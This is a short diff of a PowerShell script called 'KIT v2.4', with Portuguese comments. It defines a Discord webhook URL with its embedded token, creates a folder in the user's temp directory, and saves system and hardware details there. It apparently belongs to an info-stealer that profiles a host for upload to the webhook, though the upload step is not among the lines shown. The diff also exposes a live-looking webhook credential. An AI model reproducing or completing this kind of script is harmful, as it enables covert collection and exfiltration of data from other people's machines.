@@ -1,8 +1,8 @@
-# KIT v2.3 – 10 MB max, PS 7.5.4, sem erros
+# KIT v2.4 – 10 MB max, PS 7.5.4, zero erros
 $hook="https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTphqVq0Rr2uLqyFwSAk3HJ7E1UCWoCEL-wJ1Qp4HDcHdlSH7vYkV"
 $kit="$env:TEMP\k"; ni -ItemType Directory $kit -Force |Out-Null
 
-# 1) TXT leves
+# 1) TXT leves (CIM separados)
 systeminfo |Out-File $kit\sys.txt -Encoding UTF8
 Get-CimInstance Win32_ComputerSystem |Out-File $kit\hw.txt -Encoding UTF8
 Get-CimInstance Win32_Processor |Out-File $kit\hw.txt -Append -Encoding UTF8
